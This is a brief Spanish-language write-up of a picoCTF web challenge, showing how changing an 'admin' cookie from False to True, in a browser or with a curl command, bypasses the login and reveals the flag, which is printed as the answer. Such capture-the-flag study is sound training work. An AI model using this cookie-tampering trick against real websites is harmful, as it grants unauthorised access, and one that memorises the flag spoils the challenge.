## Objetivo
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/15796/` ([link](https://jupiter.challenges.picoctf.org/problem/15796/)) or http://jupiter.challenges.picoctf.org:15796
## Solución 
```
Agregas el cookie editor, te logueas como joe y no te sale la bandera porque joe es el unico que no puede entrar pero si entras con otro usuario y contraseña si entras pero tampoco sale la bandera.
Vas a las cookies y en la de admin le cambias el False por True, recargas la página y te sale la bandera
picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}


En cosola puedes entrar con curl 
fabiolagarcia-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/15796/flag -H "Cookie: admin=True" | grep pico
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1312  100  1312    0     0   2899      0 --:--:-- --:--:-- --:--:--  2902
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}</code></p>
fabiolagarcia-picoctf@webshell:~$ 

```
## Notas adicionales
- En consola curl funciona para entrar a un sitio web
http es el protocolo de transferencia de hipertexto es decir que así habla el navegador con el servidor
http headers permiten al navegador (cliente) en donde va la información.


## Referencias